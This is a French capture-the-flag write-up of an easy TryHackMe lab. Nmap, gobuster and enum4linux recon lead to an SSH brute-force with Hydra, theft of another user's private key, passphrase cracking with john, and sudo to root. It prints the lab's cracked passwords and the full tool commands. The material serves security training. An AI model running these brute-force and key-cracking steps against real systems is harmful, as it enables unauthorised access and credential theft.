# Introduction

Ceci est un write up d'un CTF de type EASY sur la plateforme TryHackme.

IP de la cible : 10.10.42.222
# Reconnaissance

La 1ère étape consiste à effectuer une reconnaissance active. Pour commencer, j'effectue différents scans avec Nmap pour tenter d'obtenir des informations tels que les ports et services ouverts ainsi que les versions de ces services afin d'identifier ceux qui sont potentiellement vulnérables.

N.B. : les résultats en vert seront les informations intéressantes.
## **Scan Nmap** 
### Scan SYN

sudo nmap -sS -T4 -p- 10.10.42.222 >> scan_syn.md

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-12 09:42 CEST
Nmap scan report for 10.10.42.222
Host is up (0.024s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
<font color="#00b050">22/tcp   open  ssh</font>
<font color="#00b050">80/tcp   open  http</font>
<font color="#00b050">139/tcp  open  netbios-ssn</font>
<font color="#00b050">445/tcp  open  microsoft-ds</font>
8009/tcp open  ajp13
<font color="#00b050">8080/tcp open  http-proxy</font>

Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds

### Scan Version

sudo nmap -sV -T4 -p 22,80,139,445,8080 10.10.42.222 >> scan_version.md

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-12 09:45 CEST
Nmap scan report for 10.10.42.222
Host is up (0.023s latency).

PORT     STATE SERVICE     VERSION
<font color="#00b050">22/tcp   open  ssh         OpenSSH 7.2p2</font> Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
<font color="#00b050">80/tcp   open  http        Apache httpd 2.4.18</font> ((Ubuntu))
<font color="#00b050">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X</font> (workgroup: WORKGROUP)
<font color="#00b050">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X</font> (workgroup: WORKGROUP)
<font color="#00b050">8080/tcp open  http        Apache Tomcat 9.0.7</font>
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.76 seconds
### Scan Complet

sudo nmap -A -T4 -p 22,80,139,445,8080 10.10.42.222 >> scan_full.md

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-12 09:47 CEST
Nmap scan report for 10.10.42.222
Host is up (0.024s latency).

PORT     STATE SERVICE     VERSION
<font color="#00b050">22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4</font> (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
<font color="#00b050">80/tcp   open  http        Apache httpd 2.4.18</font> ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
<font color="#00b050">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X</font> (workgroup: WORKGROUP)
<font color="#00b050">445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu</font> (workgroup: WORKGROUP)
<font color="#00b050">8080/tcp open  http        Apache Tomcat 9.0.7</font>
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.4
OS details: Linux 5.4
Network Distance: 2 hops
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2024-07-12T03:47:17-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: unknown, NetBIOS MAC: unknown (unknown)
| <font color="#00b050">smb-security-mode: </font>
<font color="#00b050">|   account_used: guest</font>
<font color="#00b050">|   authentication_level: user</font>
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-07-12T07:47:17
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   24.11 ms 10.9.0.1
2   24.23 ms 10.10.42.222

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds

### Scan Vulnérabilité

sudo nmap --script *smb* -p 445 10.10.42.222 >> scan_smb.md

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-12 09:49 CEST
Nmap scan report for 10.10.42.222
Host is up (0.024s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-print-text: false
| smb-os-discovery: 
|   <font color="#00b050">OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</font>
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2024-07-12T03:54:49-04:00
| smb2-capabilities: 
|   2:0:2: 
|     Distributed File System
|   2:1:0: 
|     Distributed File System
|     Multi-credit operations
|   3:0:0: 
|     Distributed File System
|     Multi-credit operations
|   3:0:2: 
|     Distributed File System
|     Multi-credit operations
|   3:1:1: 
|     Distributed File System
|_    Multi-credit operations
| smb-enum-domains: 
|   BASIC2
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled
|_smb-flood: ERROR: Script execution failed (use -d to debug)
| <font color="#00b050">smb-security-mode: </font>
<font color="#00b050">|   account_used: guest</font>
<font color="#00b050">|   authentication_level: user</font>
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-system-info: ERROR: Script execution failed (use -d to debug)
| smb-brute: 
|_  No accounts found
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
| smb2-time: 
|   date: 2024-07-12T07:49:49
|_  start_date: N/A
| smb-mbenum: 
|   DFS Root
|     BASIC2  0.0  Samba Server 4.3.11-Ubuntu
|   Master Browser
|     BASIC2  0.0  Samba Server 4.3.11-Ubuntu
|   Print server
|     BASIC2  0.0  Samba Server 4.3.11-Ubuntu
|   Server
|     BASIC2  0.0  Samba Server 4.3.11-Ubuntu
|   Server service
|     BASIC2  0.0  Samba Server 4.3.11-Ubuntu
|   Unix server
|     BASIC2  0.0  Samba Server 4.3.11-Ubuntu
|   Windows NT/2000/XP/2003 server
|     BASIC2  0.0  Samba Server 4.3.11-Ubuntu
|   Workstation
|_    BASIC2  0.0  Samba Server 4.3.11-Ubuntu
|_smb-vuln-ms10-061: false
| smb-enum-sessions: 
|_  nobody
| smb-vuln-regsvc-dos: 
|   <font color="#00b050">VULNERABLE:</font>
<font color="#00b050">|   Service regsvc in Microsoft Windows systems vulnerable to denial of service</font>
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
| smb-ls: Volume \\10.10.42.222\Anonymous
| SIZE   TIME                 FILENAME
| DIR>  2018-04-19T17:31:20  .
| DIR>  2018-04-19T17:13:06  ..
| 173    2018-04-19T17:29:55  <font color="#00b050">staff.txt</font>
|_
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.42.222\Anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: unlimited>
|     Path: C:\samba\anonymous
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.42.222\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba Server 4.3.11-Ubuntu)
|     Users: 2
|     Max Users: unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|_    Current user access: READ/WRITE
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 312.25 seconds


> [!NOTE] Information importante
> Suite aux différents scans, nous savons qu'il y a un serveur web (port 80 et port 8080) actif ainsi qu'un partage de fichiers sur le port 445. Nous savons aussi que le partage peut être consulté en tant qu'anonyme.
> En accédant au partage samba, on peut accéder à un fichier nommé staff.txt contenant les noms de 2 utilisateurs qui sont des réponses au questionnaire à savoir Kay et Jan, nous pourrions directement tenter de brute force leurs mot de passe mais le questionnaire est construit de manière à ce qu'on suive certaines étapes. Nous allons donc continuer en faisant l'énumération du site web.
> ![[Screenshot_2024-07-12_10-04-26.png]]
>


## Enumeration

### Gobuster

sudo gobuster dir -e -u http://10.10.42.222 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt >> Rapport.md

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.42.222
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

<font color="#00b050">[2Khttp://10.10.42.222/development          (Status: 301) [Size: 318] [--> http://10.10.42.222/development/]</font>

[2Khttp://10.10.42.222/server-status        (Status: 403) [Size: 300]

===============================================================
Finished
=============================================================
A la question quel est le dossier caché du serveur web je peux répondre /development à l'intérieur de ce dossier se trouve 2 fichiers, le fichier nommé ****** me donne des initiales K et J voyons si l'énumération du partage de fichier peut nous apporter des informations complémentaires. 
### enume4linux

enum4linux -a 10.10.42.222 >> Rapport.md

Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jul 12 10:07:59 2024

[34m =========================================( [0m[32mTarget Information[0m[34m )=========================================

[0mTarget ........... 10.10.42.222
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


[34m ============================( [0m[32mEnumerating Workgroup/Domain on 10.10.42.222[0m[34m )============================

[0m[33m
[+] [0m[32mGot domain/workgroup name: WORKGROUP

[0m
[34m ================================( [0m[32mNbtstat Information for 10.10.42.222[0m[34m )================================

[0mLooking up status of 10.10.42.222
	BASIC2          00> -         B ACTIVE>  Workstation Service
	BASIC2          03> -         B ACTIVE>  Messenger Service
	BASIC2          20> -         B ACTIVE>  File Server Service
	..__MSBROWSE__. 01> - GROUP> B ACTIVE>  Master Browser
	WORKGROUP       00> - GROUP> B ACTIVE>  Domain/Workgroup Name
	WORKGROUP       1d> -         B ACTIVE>  Master Browser
	WORKGROUP       1e> - GROUP> B ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

[34m ===================================( [0m[32mSession Check on 10.10.42.222[0m[34m )===================================

[0m[33m
[+] [0m[32mServer 10.10.42.222 allows sessions using username '', password ''

[0m
[34m ================================( [0m[32mGetting domain SID for 10.10.42.222[0m[34m )================================

[0mDomain Name: WORKGROUP
Domain Sid: (NULL SID)
[33m
[+] [0m[32mCan't determine if host is part of domain or part of a workgroup

[0m
[34m ===================================( [0m[32mOS information on 10.10.42.222[0m[34m )===================================

[0m[33m
[E] [0m[31mCan't get OS info with smbclient

[0m[33m
[+] [0m[32mGot OS info for 10.10.42.222 from srvinfo: 
[0m	BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03


[34m =======================================( [0m[32mUsers on 10.10.42.222[0m[34m )=======================================

[0m

[34m =================================( [0m[32mShare Enumeration on 10.10.42.222[0m[34m )=================================

[0m
	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            BASIC2
[33m
[+] [0m[32mAttempting to map shares on 10.10.42.222

[0m//10.10.42.222/Anonymous	[35mMapping: [0mOK[35m Listing: [0mOK[35m Writing: [0mN/A
[33m
[E] [0m[31mCan't understand response:

[0mNT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.42.222/IPC$	[35mMapping: [0mN/A[35m Listing: [0mN/A[35m Writing: [0mN/A

[34m ============================( [0m[32mPassword Policy Information for 10.10.42.222[0m[34m )============================

[0m

[+] Attaching to 10.10.42.222 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] BASIC2
	[+] Builtin

[+] Password Info for Domain: BASIC2

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[33m
[+] [0m[32mRetieved partial password policy with rpcclient:


[0mPassword Complexity: Disabled
Minimum Password Length: 5


[34m =======================================( [0m[32mGroups on 10.10.42.222[0m[34m )=======================================

[0m[33m
[+] [0m[32mGetting builtin groups:

[0m[33m
[+] [0m[32m Getting builtin group memberships:

[0m[33m
[+] [0m[32m Getting local groups:

[0m[33m
[+] [0m[32m Getting local group memberships:

[0m[33m
[+] [0m[32m Getting domain groups:

[0m[33m
[+] [0m[32m Getting domain group memberships:

[0m
[34m ==================( [0m[32mUsers on 10.10.42.222 via RID cycling (RIDS: 500-550,1000-1050)[0m[34m )==================

[0m[33m
[I] [0m[36mFound new SID: 
[0mS-1-22-1
[33m
[I] [0m[36mFound new SID: 
[0mS-1-5-32
[33m
[I] [0m[36mFound new SID: 
[0mS-1-5-32
[33m
[I] [0m[36mFound new SID: 
[0mS-1-5-32
[33m
[I] [0m[36mFound new SID: 
[0mS-1-5-32
[33m
[+] [0m[32mEnumerating users using SID S-1-22-1 and logon username '', password ''

<font color="#00b050">[0mS-1-22-1-1000 Unix User\kay (Local User)</font>
<font color="#00b050">S-1-22-1-1001 Unix User\jan (Local User)</font>
[33m
[+] [0m[32mEnumerating users using SID S-1-5-32 and logon username '', password ''

[0mS-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
[33m
[+] [0m[32mEnumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''

[0mS-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)

[34m ===============================( [0m[32mGetting printer info for 10.10.42.222[0m[34m )===============================

[0mNo printers returned.


enum4linux complete on Fri Jul 12 10:10:08 2024

L'énumération me donne les noms complets (que j'avais déjà trouvé en utilisant le script smb de nmap qui était du coup plus rapide à effectuer)

## Brute-Force

Pour tenter d'acquérir l'accès au système, nous allons tenter de se connecter avec un des deux comptes. Je décide de me concentrer sur jan car kay a l'air d'être l'administrateur système et donc potentiellement mieux protégé. Pour deviner le mot de passe de jan j'utilise hydra qui va tester les mots de passe présent dans la wordlist rockyou en utilisant le service SSH (réponse au questionnaire)
### Hydra

hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.42.222 >> Rapport.md 

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-12 10:30:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.42.222:22/
[STATUS] 146.00 tries/min, 146 tries in 00:01h, 14344256 to do in 1637:29h, 13 active
[STATUS] 113.00 tries/min, 339 tries in 00:03h, 14344063 to do in 2115:39h, 13 active
[STATUS] 95.14 tries/min, 666 tries in 00:07h, 14343736 to do in 2512:40h, 13 active
[22][ssh] host: 10.10.42.222   <font color="#00b050">login: jan   password: armando</font>
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-12 10:38:58

Heureusement pour moi hydra a planté après avoir découvert le mot de passe de jan. Nous allons pouvoir accéder au système en utilisant le protocole SSH et tenter de trouver une solution pour obtenir plus de droit

![[Screenshot_2024-07-12_10-49-13.png]]
![[Screenshot_2024-07-12_10-49-46.png]]

J'affiche le dossier courant dans lequel je suis

![[Screenshot_2024-07-12_10-50-38.png]]

Je vois que je suis dans le dossier /home/jan, je décide de me déplacer dans le dossier home et d'afficher son contenu

![[Screenshot_2024-07-12_10-51-13.png]]

Je me rend ensuite dans le dossier de kay et de faire la même chose

![[Screenshot_2024-07-12_10-52-46.png]]

Le fichier pass.bak m'interpelle mais jan n'a pas les permissions pour y accéder (voir figure ci-dessous) je décide donc de m'intéresser au dossier .ssh

![[Screenshot_2024-07-12_10-53-14.png]]
![[Screenshot_2024-07-12_11-01-50.png]]

Bingo! je tombe sur le fichier id_rsa qui contient la clé privée de kay, let's HASH it :)

![[Screenshot_2024-07-12_11-02-30.png]]
On sauvegarde la clé ssh dans un fichier texte sur notre machine

## Privilege escalation

On utilise ssh2john pour récupérer le hash

![[Screenshot_2024-07-12_11-04-14.png]]

Ensuite on utilise "john" pour récupérer la passphrase ssh de kay

john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt >> Rapport.md

Created directory: /home/kota/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<font color="#00b050">beeswax          (id_rsa.txt)</font>     
1g 0:00:00:00 DONE (2024-07-12 11:06) 33.33g/s 2757Kp/s 2757Kc/s 2757KC/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

Il nous reste plus qu'à se connecter en ssh en utilisant la clé de kay ainsi que sa passphrase

![[Screenshot_2024-07-12_11-11-48.png]]

That's it ! Il ne vous reste plus qu'à afficher le contenu de pass.bak et vous avez la réponse à la dernière question du formulaire de tryhackme

![[Screenshot_2024-07-12_11-12-44.png]]

Et voilà merci bonsoir...

... enfin pas tout à fait voici en Bonus 

Quels sont les droits de kay sur la machine ? Tous en utilisant sudo

![[Screenshot_2024-07-12_11-20-06.png]]

Ok let's do this ! Leeroyyyyyyyy 

je m'emballe, en s'octroyant les droits root (avec le mot de passe trouvé à la dernière question du formulaire) sur la machine nous avons les accès administrateurs. Et nous pouvons accéder au dossier /root

![[Screenshot_2024-07-12_11-21-47.png]]

## Mission execution

Le fichier flag me semble intéressant. Affichons son contenu

![[Screenshot_2024-07-12_11-22-33.png]]

Et voilà nous avons été au bout du challenge.